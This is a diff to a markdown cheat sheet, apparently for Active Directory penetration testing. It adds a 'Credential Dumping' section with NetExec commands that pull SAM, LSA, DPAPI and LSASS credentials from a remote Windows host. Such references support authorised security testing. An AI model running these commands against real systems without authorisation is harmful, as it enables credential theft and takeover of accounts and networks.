@@ -684,6 +684,29 @@ bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> 
 </details>
 
 <details>
+  <summary><strong>Credential Dumping</strong></summary>
+  
+  ### Dump SAM
+  ```shell
+  NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash[LM:NT]]> --sam
+  ```
+
+  ### Dump LSA 
+  ```shell
+  NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash_NT]> --lsa
+  ```
+
+  ### Dump DPAPI 
+  ```shell
+  NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash_NT]> --dpapi
+  ```
+
+  ### Dump LSASS
+  ```shell
+  NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -M lsassy
+  ```
+
+<details>
   <summary><strong>MSSQL</strong></summary>
 
 </details>
